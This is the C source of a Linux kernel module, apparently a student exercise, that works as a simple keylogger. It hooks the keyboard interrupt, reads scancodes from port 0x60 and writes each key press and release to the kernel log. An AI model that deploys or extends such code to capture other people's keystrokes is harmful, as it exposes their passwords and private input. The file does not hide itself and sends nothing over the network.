#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/interrupt.h>
#include <linux/hil.h>
#include <linux/io.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Sebastien Nicolet <snicolet@student.42.fr>");
MODULE_DESCRIPTION("keyboard bad keylogger");

#define	MODULE_NAME		"keylogger"
#define KEYBOARD_IRQ	1

struct key_map {
	char			acii;
	unsigned int	scancode;
	const char		*name;
};

static const struct key_map key_table[] =
{
	(struct key_map){0x0, 0, "NUL"},
	(struct key_map){0x1, 1, "Escape"},
	(struct key_map){'\t', 15, "TAB"},
	(struct key_map){0x7f, 14, "DEL"},
	(struct key_map){'q', 16, "q"},
	(struct key_map){'w', 17, "w"},
	(struct key_map){'e', 18, "e"},
	(struct key_map){'r', 19, "r"},
	(struct key_map){'t', 20, "t"},
	(struct key_map){'y', 21, "y"},
	(struct key_map){'u', 22, "u"},
	(struct key_map){'i', 23, "i"},
	(struct key_map){'o', 24, "o"},
	(struct key_map){'p', 25, "p"},
	(struct key_map){'[', 26, "["},
	(struct key_map){']', 27, "]"},
	(struct key_map){'\\', 28, "\\"},
	(struct key_map){'a', 30, "a"},
	(struct key_map){'s', 31, "s"},
	(struct key_map){'d', 32, "d"},
	(struct key_map){'f', 33, "f"},
	(struct key_map){'g', 34, "g"},
	(struct key_map){'h', 35, "h"},
	(struct key_map){'j', 36, "j"},
	(struct key_map){'k', 37, "k"},
	(struct key_map){'l', 38, "l"},
	(struct key_map){';', 39, ";"},
	(struct key_map){'\'', 40, "'"},
	(struct key_map){0x0, 0, NULL}
};

static const struct key_map *get_key(const unsigned int scancode)
{
	size_t		i;

	i = 0;
	while (key_table[i].name) {
		if (key_table[i].scancode == scancode)
			return &key_table[i];
		i++;
	}
	return NULL;
}

static ssize_t	read_key(struct file *file, char __user *buf, size_t size,
	loff_t *offset)
{
	return 0;
}

static ssize_t	write_key(struct file *file, const char __user *buf, size_t size,
	loff_t *offset)
{
	return 0;
}

static irqreturn_t	key_handler(int irq, void *dev_id)
{
	unsigned int			scancode;
	const struct key_map	*key;

	scancode = inb (0x60);
	key = get_key(scancode & 0x7f);

	pr_info("(scan: %3u) -> %s : %s\n", scancode, (key ? key->name : "/"),
		(scancode & 0x80 ? "released" : "pressed"));
	return IRQ_HANDLED;
}

static void		__exit hello_cleanup(void)
{
	printk(KERN_INFO MODULE_NAME "Cleaning up module.\n");
	free_irq(KEYBOARD_IRQ, &key_handler);
}

static int		__init hello_init(void)
{
	int		ret;

	printk(KERN_INFO MODULE_NAME "init !\n");
	ret = request_irq(KEYBOARD_IRQ, &key_handler, IRQF_SHARED, MODULE_NAME,
		&key_handler);
	if (ret < 0) {
		pr_err("failed to request keyboard irq: %d\n", ret);
		return ret;
	}
	return 0;
}

module_init(hello_init);
module_exit(hello_cleanup);
